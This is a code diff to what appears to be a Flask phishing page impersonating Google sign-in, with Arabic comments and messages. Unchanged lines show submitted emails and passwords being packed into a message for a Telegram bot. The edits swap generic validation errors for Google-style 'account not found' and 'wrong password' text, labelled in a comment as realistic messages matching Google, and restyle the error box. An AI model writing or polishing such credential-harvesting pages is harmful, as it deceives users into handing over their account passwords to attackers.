@@ -20,20 +20,20 @@ def login():
     email_val = request.form.get("email", "").strip()
     password = request.form.get("password", "")
 
-    # نمط فحص صحة البريد الإلكتروني أو رقم الهاتف
+    # أنماط التحقق من صحة الإدخال
     email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
     phone_pattern = r"^\+?[0-9]{10,15}$"
 
-    # الشروط الصارمة المحددة
+    # رسائل خطأ واقعية مطابقة لجوجل
     if not (
         re.match(email_pattern, email_val) or re.match(phone_pattern, email_val)
     ):
-      error = (
-          "عذراً، يرجى إدخال بريد إلكتروني صحيح (مثل example@gmail.com) أو رقم"
-          " هاتف صحيح."
-      )
+      error = "لم يتم العثور على حسابك على Google. يُرجى التحقق من عنوان البريد الإلكتروني."
     elif len(password) <= 6:
-      error = "كلمة المرور قصيرة جداً. يجب أن تكون أكثر من 6 أحرف أو أرقام."
+      error = (
+          "كلمة المرور غير صحيحة. يُرجى إعادة المحاولة أو النقر على 'هل نسيت"
+          " كلمة المرور؟' لإعادة تعيينها."
+      )
     else:
       if BOT_TOKEN and CHAT_ID:
         msg = (
@@ -92,11 +92,11 @@ def login():
         .error-msg { 
             color: #d93025; 
             font-size: 13px; 
-            line-height: 18px; 
+            line-height: 20px; 
             margin-bottom: 15px; 
             width: 100%; 
-            text-align: center; 
-            font-weight: 500; 
+            text-align: right; 
+            font-weight: 400; 
             background: #fce8e6; 
             padding: 12px; 
             border-radius: 8px; 
